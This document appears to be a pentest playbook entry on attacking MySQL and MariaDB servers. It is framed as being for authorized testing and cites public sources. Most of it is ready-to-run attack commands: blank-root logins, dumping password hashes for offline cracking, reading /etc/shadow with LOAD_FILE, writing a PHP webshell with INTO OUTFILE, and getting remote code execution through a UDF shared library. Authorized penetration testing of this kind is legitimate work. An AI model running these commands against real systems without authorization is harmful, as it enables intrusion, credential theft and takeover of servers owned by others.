---
service: mysql
title: MySQL / MariaDB
ports: 3306
aliases: mysqld, mariadb
---

# MySQL / MariaDB — quick wins

**When you see it:** 3306/tcp open and `mysql -h H -u root` connects without a
password → unauthenticated root, full database access, and potential OS-level
primitives via FILE privilege and UDF loading.

> Authorized testing only. Triage is read-only; steps marked ✏️ write to the
> target — get sign-off before executing and clean up artefacts afterwards.

## Triage (read-only)
```sh
# Banner + empty-password check via nmap
nmap -sV -p3306 --script mysql-info,mysql-empty-password,mysql-variables H

# Anonymous / root login attempt
mysql -h H -u root --connect-timeout=5 -e "SELECT VERSION(), USER(), @@hostname;"
mysql -h H -u ""   --connect-timeout=5 -e "SELECT VERSION(), USER();"

# Gate check — governs OUTFILE, LOAD_FILE, and UDF paths
mysql -h H -u U -pP -e "SELECT @@secure_file_priv; SHOW GRANTS;"

# Dump user table (version-conditional column name)
mysql -h H -u U -pP -e \
  "SELECT user,host,plugin,authentication_string FROM mysql.user;"
# pre-5.7 MariaDB: column is 'Password' not 'authentication_string'
```

## Quick wins

### Blank/default root login
```sh
mysql -h H -u root --connect-timeout=5
mysql -h H -u root -p''  # MariaDB sometimes needs the flag
```
*Why:* many default installs ship with root and no password; instant full access.

### Dump password hashes for offline cracking
```sh
mysql -h H -u U -pP -e \
  "SELECT user,host,authentication_string FROM mysql.user WHERE authentication_string != '';"
# MariaDB / MySQL <5.7: column is 'Password'
```
*Why:* hashes are in `mysql_native_password` (`*HASH`) or `caching_sha2_password`
format; crack offline with hashcat mode 300 or 7401 respectively.

### FILE privilege — read arbitrary files
```sh
mysql -h H -u U -pP -e "SELECT LOAD_FILE('/etc/passwd');"
mysql -h H -u U -pP -e "SELECT LOAD_FILE('/etc/shadow');"  # root context only
```
*Why:* `LOAD_FILE()` reads any file readable by the MySQL process user.
Requires `FILE` privilege and `secure_file_priv` must be `NULL` or empty.

### INTO OUTFILE — webshell write ✏️
```sh
mysql -h H -u U -pP -e \
  "SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
# curl "http://H/shell.php?c=id"
```
*Why:* writes a PHP webshell when MySQL and a web server share the host.
`secure_file_priv` must be `NULL` or point to the webroot; the target path must
not already exist (OUTFILE won't overwrite).

### SSL bypass (older clients / MariaDB)
```sh
mysql -h H -u U -pP --ssl=0
```
*Why:* some older setups require SSL by default in the client config; `--ssl=0`
forces plaintext and avoids certificate errors blocking the session.

### UDF RCE via shared library ✏️
```sh
# 1. Confirm plugin_dir and that you can write to it
mysql -h H -u U -pP -e "SHOW VARIABLES LIKE 'plugin_dir';"

# 2. Upload lib_mysqludf_sys.so via INTO DUMPFILE (binary-safe OUTFILE variant)
#    (hex-encode the .so first: xxd -p lib_mysqludf_sys.so | tr -d '\n')
mysql -h H -u U -pP -e \
  "SELECT 0xHEX_OF_SO INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';"

# 3. Register and call
mysql -h H -u U -pP -e \
  "CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';
   SELECT sys_exec('id > /tmp/pwn.txt');"
```
*Why:* a registered UDF runs as the MySQL OS user. Requires `INSERT` on
`mysql.func`, `FILE` privilege, a writable `plugin_dir`, and
`secure_file_priv=NULL`. Heavily restricted on modern hardened installs.

## aranum helpers
- `aranumtoolkit/network/enum-mysql.sh` — produced this finding (nmap NSE,
  anon/root probe, FILE priv + `secure_file_priv` check, nxc cred spray).
- No standalone exploit helper exists for MySQL; manual steps above apply.

## Gotchas
- `secure_file_priv` set to a directory path (e.g. `/var/lib/mysql-files/`)
  locks OUTFILE, LOAD_FILE, and DUMPFILE to that directory — the webshell and
  UDF paths die unless the web/plugin dir matches.
- `authentication_string` column name is MySQL 5.7+; MariaDB and older MySQL
  use `Password` — check `SELECT VERSION()` first.
- `--ssl=0` is ignored on MySQL 8 clients compiled with SSL mandatory; use
  `--ssl-mode=DISABLED` instead.
- UDF path requires `plugin_dir` to be writable by the MySQL OS user — modern
  distro packages `chown` it to root.
- MariaDB 10.4+ enforces unix_socket auth for root by default; remote root
  probes will fail even with no password configured.

## Sources
- HackTricks `3306-pentesting-mysql`; PayloadsAllTheThings MySQL injection /
  UDF section; GTFOBins mysql; Hackviser MySQL enumeration guide.
